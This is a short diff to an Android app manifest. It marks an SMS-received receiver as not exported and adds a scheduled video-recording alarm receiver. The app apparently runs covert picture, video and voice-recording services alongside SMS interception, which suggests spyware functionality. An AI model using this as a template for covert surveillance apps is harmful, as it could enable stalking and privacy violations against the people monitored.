@@ -27,9 +27,18 @@
         <service android:name=".SpyPictureService"/>
         <service android:name=".SpyVideoService"/>
         <service android:name=".SpyVoiceRecordingService"/>
-        <receiver android:name=".SmsReceiver">
+        <receiver android:name=".SmsReceiver"
+            android:exported="false"
+            >
             <intent-filter>
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".ScheduleAlarmReceiver"
+            android:exported="false"
+            >
+            <intent-filter>
+                <action android:name="com.byteShaft.videoRecordingAlarm"/>
             </intent-filter>
         </receiver>
     </application>
